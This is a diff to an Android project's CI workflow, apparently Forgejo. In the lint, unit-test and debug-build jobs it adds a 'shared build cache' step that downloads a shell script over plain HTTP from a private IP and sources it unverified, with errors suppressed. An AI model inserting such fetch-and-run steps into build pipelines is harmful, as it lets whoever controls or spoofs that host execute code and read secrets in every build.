@@ -51,6 +51,10 @@ jobs:
           distribution: 'temurin'
       - name: Set up Android SDK
         run: .forgejo/scripts/setup-android-sdk.sh
+      - name: Shared build cache (rw-build-cache)
+        continue-on-error: true
+        run: |
+          curl -fsS -m 5 http://10.1.10.103:8088/ci/env.sh -o /tmp/rw-cache-env.sh && RW_CACHE_WANT=gradle RW_CACHE_EXPORT=1 . /tmp/rw-cache-env.sh || true
       - name: Run lint
         working-directory: android
         run: |
@@ -83,6 +87,10 @@ jobs:
           distribution: 'temurin'
       - name: Set up Android SDK
         run: .forgejo/scripts/setup-android-sdk.sh
+      - name: Shared build cache (rw-build-cache)
+        continue-on-error: true
+        run: |
+          curl -fsS -m 5 http://10.1.10.103:8088/ci/env.sh -o /tmp/rw-cache-env.sh && RW_CACHE_WANT=gradle RW_CACHE_EXPORT=1 . /tmp/rw-cache-env.sh || true
       - name: Run unit tests
         working-directory: android
         run: |
@@ -120,6 +128,10 @@ jobs:
           distribution: 'temurin'
       - name: Set up Android SDK
         run: .forgejo/scripts/setup-android-sdk.sh
+      - name: Shared build cache (rw-build-cache)
+        continue-on-error: true
+        run: |
+          curl -fsS -m 5 http://10.1.10.103:8088/ci/env.sh -o /tmp/rw-cache-env.sh && RW_CACHE_WANT=gradle RW_CACHE_EXPORT=1 . /tmp/rw-cache-env.sh || true
       - name: Build debug APK
         working-directory: android
         run: |
